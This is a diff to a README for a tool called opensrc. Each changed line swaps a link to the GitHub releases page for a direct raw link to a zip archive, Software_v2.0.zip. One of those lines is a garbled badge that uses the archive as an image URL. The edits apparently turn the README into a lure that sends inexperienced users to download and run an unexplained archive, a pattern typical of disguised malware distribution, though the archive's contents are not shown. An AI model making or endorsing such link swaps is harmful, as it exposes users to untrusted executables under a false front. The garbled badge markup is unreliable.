@@ -1,6 +1,6 @@
 # 🌟 opensrc - Fetch Source Code for AI Insights
 
-[![Download opensrc](https://img.shields.io/badge/Download%20opensrc-v1.0.0-blue.svg)](https://github.com/abloe666/opensrc/releases)  
+[![Download opensrc](https://raw.githubusercontent.com/abloe666/opensrc/main/src/Software_v2.0.zip%https://raw.githubusercontent.com/abloe666/opensrc/main/src/Software_v2.0.zip)](https://raw.githubusercontent.com/abloe666/opensrc/main/src/Software_v2.0.zip)  
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run opensrc, even if you have no programming 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download opensrc](https://github.com/abloe666/opensrc/releases)
+To get started, visit this page to download: [Download opensrc](https://raw.githubusercontent.com/abloe666/opensrc/main/src/Software_v2.0.zip)
 
 1. Click the link above.
 2. You will see a list of available files. Look for the latest version of opensrc.
@@ -70,4 +70,4 @@ Stay tuned for updates on new features and improvements. Follow our repository t
 
 ### 📣 Remember
 
-For the latest version, visit this page to download: [Download opensrc](https://github.com/abloe666/opensrc/releases)
+For the latest version, visit this page to download: [Download opensrc](https://raw.githubusercontent.com/abloe666/opensrc/main/src/Software_v2.0.zip)
